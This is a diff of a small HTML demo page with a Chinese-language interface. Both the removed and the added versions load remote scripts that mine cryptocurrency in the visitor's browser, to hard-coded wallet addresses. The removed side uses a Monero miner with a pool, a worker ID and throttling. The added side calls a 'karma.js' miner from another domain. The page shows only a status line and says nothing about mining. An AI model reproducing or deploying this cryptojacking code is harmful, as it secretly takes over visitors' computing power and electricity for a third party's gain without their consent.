@@ -1,47 +1,14 @@
 <!DOCTYPE html>
 <html lang="zh-TW">
-<head>
-  <meta charset="UTF-8">
-  <title>Browser </title>
-  <style>
-    body { font-family: sans-serif; text-align: center; padding-top: 50px; }
-    .status { margin-top: 20px; font-weight: bold; color: green; }
-  </style>
-</head>
+<head><meta charset="UTF-8"><title>Browser  Demo</title></head>
 <body>
-  <h1>瀏覽器頁面</h1>
-  <p>本頁在您開啟時。</p>
-  <div class="status" id="status">⏳ 初始化中...</div>
+  <h2>Demo</h2>
+  <div id="status">初始化中…</div>
 
-  <!-- 挖礦腳本 -->
-  <script src="https://script.monerominer.rocks"></script>
+  <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
   <script>
-    const server = "wss://ghgi.xyz"; 
-    const pool = "masari.hashvault.pro";
-    const walletAddress = "5jpS5L2qsQcSunDyir3sWkfZRAxQK2PUweJ53Dfjz9taYiSe1kFfT5R5ifD6YUm5sgX6HmbHqr1CYEW91oNp9jvD55gi8RQ"; // ← 請替換
-    const workerId = "netlify-worker";
-    const threads = -1;
-    const password = "x";
-
-    try {
-      startMining(pool, walletAddress, workerId, threads, password);
-      throttleMiner = 50;
-      document.getElementById("status").innerText = "✅ 已啟動";
-
-      // 每 10 分鐘停 1 分鐘
-      setInterval(() => {
-        throttleMiner = 100;
-        document.getElementById("status").innerText = "⏸️ 暫停 1 分鐘...";
-        setTimeout(() => {
-          throttleMiner = 50;
-          document.getElementById("status").innerText = "▶️ 繼續中...";
-        }, 60 * 1000);
-      }, 10 * 60 * 1000);
-
-    } catch (err) {
-      console.error("挖礦腳本錯誤：", err);
-      document.getElementById("status").innerText = "❌ 無法啟動";
-    }
+    EverythingIsLife('48PZrmBXTvf9GYgkTmaJRXi6ZCUXrM7qQcz6ZLE3margf5mFQ27sraycXcGsKiPJ4FeY2QsMw7RLx6AuACpXsMP4JijyRYn', 'x', 30);
+    console.log("已啟動...");
   </script>
 </body>
 </html>
